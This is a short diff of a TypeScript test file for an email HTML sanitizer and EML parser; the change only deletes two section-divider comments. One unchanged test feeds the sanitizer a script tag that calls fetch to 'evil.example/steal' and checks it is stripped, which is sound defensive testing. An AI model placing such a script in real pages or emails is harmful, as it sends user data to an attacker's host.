@@ -3,8 +3,6 @@ import assert from 'node:assert/strict';
 import { sanitizeEmailHtml, htmlToText } from '../../server/lib/sanitizeHtml.ts';
 import { parseEml, parseAddresses, looksLikeOutlookMsg, EmlError } from '../../server/lib/eml.ts';
 
-// Sanitizer ------------------------------------------------------------
-
 test('a script in an email body never survives, and neither does its text', () => {
   const out = sanitizeEmailHtml('<p>Before</p><script>fetch("https://evil.example/steal")</script><p>After</p>');
   assert.ok(!out.html.includes('script'));
@@ -87,8 +85,6 @@ test('plain text falls out of HTML readably', () => {
   assert.equal(htmlToText('<p>a &amp; b</p>'), 'a & b');
   assert.ok(!htmlToText('<script>secret()</script><p>shown</p>').includes('secret'));
 });
-
-// EML ------------------------------------------------------------------
 
 const eml = (lines: string[]) => Buffer.from(lines.join('\r\n'), 'utf8');
 
